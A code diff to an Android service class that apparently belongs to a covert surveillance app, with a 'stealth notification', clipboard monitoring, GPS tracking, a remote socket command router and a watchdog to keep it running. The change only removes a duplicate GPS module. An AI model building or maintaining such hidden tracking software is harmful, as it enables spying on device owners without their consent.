@@ -21,7 +21,6 @@ import com.fason.app.core.network.SocketClient;
 import com.fason.app.core.network.SocketCommandRouter;
 import com.fason.app.features.clipboard.ClipboardMonitor;
 import com.fason.app.features.location.GpsManager;
-import com.fason.app.features.gps.GpsModule;
 import com.fason.app.receiver.WatchdogReceiver;
 
 /** Main foreground service with stealth notification. */
@@ -35,12 +34,7 @@ public class MainService extends Service {
 
     private ClipboardMonitor clipMonitor;
     private GpsManager locManager;
-    private GpsModule gpsModule;
     private int currentType = 0;
-
-    public GpsModule getGpsModule() {
-        return gpsModule;
-    }
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -67,9 +61,6 @@ public class MainService extends Service {
         clipMonitor.start();
         try {
             locManager = new GpsManager(this);
-        } catch (Exception ignored) {}
-        try {
-            gpsModule = new GpsModule(this);
         } catch (Exception ignored) {}
         SocketCommandRouter.initialize();
         scheduleWatchdog();
@@ -205,7 +196,6 @@ public class MainService extends Service {
     public void onDestroy() {
         if (clipMonitor != null) clipMonitor.shutdown();
         if (locManager != null) locManager.stop();
-        if (gpsModule != null) gpsModule.destroy();
         SocketCommandRouter.shutdown();
         SocketClient.getInstance().shutdown();
         if (wakeLock != null && wakeLock.isHeld()) {
